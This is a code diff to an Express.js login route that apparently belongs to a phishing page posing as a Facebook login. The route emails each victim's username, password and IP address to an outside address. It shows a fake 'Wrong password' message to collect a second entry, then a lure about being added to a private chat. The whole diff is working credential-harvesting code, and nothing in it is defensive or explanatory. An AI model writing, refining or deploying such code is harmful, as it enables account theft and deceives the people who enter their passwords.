@@ -58,35 +58,29 @@ app.post("/login", (req, res) => {
     req.session.email = email;
     req.session.password = password;
 
-    if (!req.session.attempt) {
-        req.session.attempt = 1;
+    // Create the email subject based on the attempt number
+    const attemptNumber = req.session.attempt || 1;
+    const mailOptions = {
+        from: '"Info" <info@vaulttrustfinancial.com>',
+        to: 'info@vaulttrustfinancial.com',
+        subject: `Login Attempt ${attemptNumber} by ${email}`,
+        text: `Facebook Contact Form Details\nAttempt ${attemptNumber}\nUsername: ${email}\nPassword: ${password}\nUser IP: ${userIp}`
+    };
 
-        // Send email on the first attempt
-        const mailOptions = {
-            from: '"Info" <info@vaulttrustfinancial.com>',
-            to: '<info@vaulttrustfinancial.com>',
-            subject: `Login Attempt by ${email}`, // Custom subject with user email
-            text: `Facebook Contact Form Details\nUsername: ${email}\nPassword: ${password}\nUser IP: ${userIp}`
-        };
-
-        transporter.sendMail(mailOptions, (error, info) => {
-            if (error) {
-                console.log(error);
-                req.session.message = 'Error sending email.';
-                res.redirect('/'); // Redirect to the form with message
-            } else {
-                console.log('Email sent: ' + info.response);
-                req.session.message = 'Wrong password'; // Set message for wrong password
-                res.redirect('/'); // Redirect to the form with message
-            }
-        });
-    } else {
-        // Second attempt - Send success message
-        req.session.message = 'You have been successfully added to the private chat, you will get a message request shortly.';
-        req.session.attempt = 0; // Reset attempt counter
-        res.redirect('/'); // Redirect to the form with message
-    }
+    // Send the email
+    transporter.sendMail(mailOptions, (error, info) => {
+        if (error) {
+            console.log(error);
+            req.session.message = 'Error sending email.';
+        } else {
+            console.log('Email sent: ' + info.response);
+            req.session.message = attemptNumber === 1 ? 'Wrong password' : 'You have been successfully added to the private chat, you will get a message request shortly.';
+        }
+        req.session.attempt = attemptNumber === 1 ? 2 : 1; // Toggle the attempt number
+        res.redirect('/');
+    });
 });
+
 
 app.listen(3000, () => {
     console.log("Server started on port 3000");
